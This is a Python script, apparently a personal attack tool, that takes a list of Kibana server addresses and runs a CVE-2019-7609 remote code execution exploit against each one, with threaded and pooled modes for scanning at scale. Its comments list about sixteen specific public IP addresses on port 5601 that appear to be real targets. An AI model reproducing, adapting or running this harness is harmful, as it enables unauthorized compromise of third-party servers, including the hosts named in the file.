import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
line_break = ''
filename = Path(__file__).name.strip('.py')

file_path = Path(__file__).resolve().parent
result_path = file_path/'result'/f'{filename}.txt'


def exploit(ip_, index):
    try:

        # url = ip_+'/app/kibana#/'
        # # print(url)
        # res = requests.get(url, headers=headers, timeout=8, verify=False)
        # if 'login' in res.text:
        #     return
        # print(res, len(res.text))
        # print(ip_)
        # with result_path.open('a+') as file:
        #     file.write(ip_+line_break)
        os.chdir(r'D:\BaiduNetdiskDownload\Tools\漏洞利用\未授权漏洞\CVE-2019-7609')
        addr=ip_.strip('\n')
        command=f"python CVE-2019-7609-kibana-rce.py -u {addr}"
        # print(command)
        os.system(command)
        # res=os.popen(command).read()
        # print(res, len(res.text))
        # print(index,ip_)

    except Exception as e:
        # print(e)
        pass

# url=''
# exploit(url)


threads = []
# with open(r'D:\Downloads\tmp\kibana.txt', 'r') as file:
# with result_path.open('r') as file:
with open(r'D:\C#\VSCODE\未授权访问漏洞\poc\result\Kibana_shell.txt', 'r') as file:

    urls = []
    for index, line in enumerate(file):
        start = 58
        end = start+1

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 10
# print(urls)
# http://1.116.90.210:5601
# http://150.158.35.92:5601
# http://1.15.129.125:5601
# http://39.103.183.163:5601
# http://123.249.105.26:5601
# http://116.205.135.190:5601
# http://43.143.167.221:5601
# http://139.196.175.129:5601
# http://47.106.34.60:5601
# http://124.71.34.50:5601
# http://42.192.221.100:5601
# http://129.211.70.227:5601
# http://124.222.229.254:5601
# http://114.132.76.63:5601
# http://123.103.41.166:5601 
# http://104.250.50.25:5601

test = 'mt'


if test == 't':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test == 'm':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()
